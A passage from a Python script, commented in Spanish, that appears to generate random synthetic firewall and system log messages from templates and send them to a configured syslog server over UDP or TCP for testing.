    return random.choice(['/dev/sda1', '/dev/sdb1', '/dev/nvme0n1'])

def random_share_name():
    return random.choice(['Public', 'SharedDocs', 'Backup', 'Media', 'Projects'])

def random_dst_port():
    return random_port()  # Reutilizar la función `random_port`

def random_package_name():
    return random.choice(['nginx', 'apache2', 'mysql', 'postgresql', 'redis', 'mongodb', 'ssh', 'ftp', 'httpd'])

def random_temp():
    return random.randint(30, 100)  # Temperatura en °C

def random_devname():
    return random.choice(['FGT01', 'FGT02', 'FGT03', 'FGT04'])

def random_logid():
    return random.choice(['0100010001', '0200020002', '0300030003'])

def random_severity():
    return random.choice(['low', 'medium', 'high', 'critical'])

def random_iface():
    return random.choice(['eth0', 'eth1', 'wlan0', 'lo'])

def random_session():
    return random.randint(1000, 9999)

def random_rule():
    return random.choice(['AllowAll', 'DenyAll', 'CustomRule'])

def random_object():
    return random.choice(['Object1', 'Object2', 'Object3'])

# Clase para enviar logs
class SyslogSender:
    def __init__(self, server, port, protocol='UDP'):
        self.server = server
        self.port = port
        if protocol.upper() == 'TCP':
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((server, port))
        else:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    def send(self, message):
        if self.sock.type == socket.SOCK_STREAM:
            self.sock.sendall((message + '\n').encode())
        else:
            self.sock.sendto(message.encode(), (self.server, self.port))

# Mostrar progreso
def mostrar_progreso(actual, total):
    pct = (actual / total) * 100
    print(f"Progreso: {actual}/{total} logs enviados ({pct:.2f}%)", end="\r")

# Validar plantillas
def validar_plantilla(template, data):
    try:
        template.format(**data)
        return True
    except KeyError as e:
        print(f"\n[ERROR] Falta el marcador: {e} en la plantilla: {template}")
        return False

if __name__ == '__main__':
    # Combinar todas las plantillas de todas las marcas en una lista única
    todas_las_plantillas = []
    for marca in LOG_TEMPLATES.values():
        todas_las_plantillas.extend(marca)

    # Cantidad de logs como float
    try:
        total = float(input("¿Cuántos logs deseas enviar? (puede ser decimal): "))
    except:
        total = 100.0
    total_int = int(total)

    # Intervalo como float
    try:
        intervalo = float(input("Intervalo entre logs (segundos, defecto 1): ") or 1.0)
    except:
        intervalo = 1.0

    sender = SyslogSender(SYSLOG_SERVER, SYSLOG_PORT, PROTOCOL)
    print(f"Iniciando simulación: {total_int} logs aleatorios, intervalo {intervalo}s")

    for i in range(total_int):
        # Seleccionar una plantilla aleatoria de todas las marcas
        template = random.choice(todas_las_plantillas)
        now = datetime.now()
        data = {
            'date': now.strftime('%Y-%m-%d'),
            'time': now.strftime('%H:%M:%S'),
            'src': random_ip(),
            'src_ip': random_ip(),
            'dst': random_ip(),
            'dst_ip': random_dst_ip(),
            'sport': random_port(),
            'dport': random_port(),
            'port': random_port(),
            'dst_port': random_dst_port(),
            'src_port': random_src_port(),
            'pid': random.randint(100, 9999),
            'user': random_user(),
            'policy': random.randint(1, 100),
            'service': random_service(),
            'service_name': random_service_name(),
            'event': random_event(),
            'process': random_process(),
            'command': random_command(),
            'setting': random_setting(),
            'value': random_value(),
            'action': random.choice(['login', 'logout', 'config-change']),
            'load': random_load(),
            'object_name': random_object_name(),
            'rule_name': random_rule_name(),
            'file_hash': random_file_hash(),
            'file_name': random_file_name(),
            'threat_name': random_threat_name(),
            'domain': random_domain(),
            'url': random_url(),
            'category': random_category(),
            'mapping_name': random_mapping_name(),
            'file_path': random_file_path(),
            'device': random_device(),
            'mount_point': random_mount_point(),
            'filesystem': random_filesystem(),
            'free_space': random_free_space(),
            'cpu_usage': random_cpu_usage(),
            'memory_usage': random_memory_usage(),
            'timezone': random_timezone(),
            'update': random_update(),
            'details': random_details(),
            'dir_path': random_dir_path(),
            'script_path': random_script_path(),
            'tool_name': random_tool_name(),
            'job_name': random_job_name(),
            'feature': random_feature(),
            'interface': random_interface(),
            'dns_servers': random_dns_servers(),
            'gateway': random_gateway(),
            'ip_address': random_ip_address(),
            'start_type': random_start_type(),
            'state': random_state(),
            'version': random_version(),
            'file_type': random_file_type(),
            'verdict': random_verdict(),
            'admin': random_admin(),
            'group': random_group(),
            'acl': random_acl(),
            'protocol': random_protocol(),
            'type': random_type(),
            'code': random_code(),
            'sigid': random_sigid(),
            'trap': random_trap(),
            'status': random_status(),
            'filename': random_filename(),
            'disk': random_disk(),
            'share_name': random_share_name(),
            'package_name': random_package_name(),
            'temp': random_temp(),
            'devname': random_devname(),
            'logid': random_logid(),
            'severity': random_severity(),
            'iface': random_iface(),
            'session': random_session(),
            'rule': random_rule(),
            'object': random_object(),
        }
        if validar_plantilla(template, data):
            log = template.format(**data)
            print(log)
            sender.send(log)
            mostrar_progreso(i + 1, total_int)
        time.sleep(intervalo)

    print("\nSimulación completada.")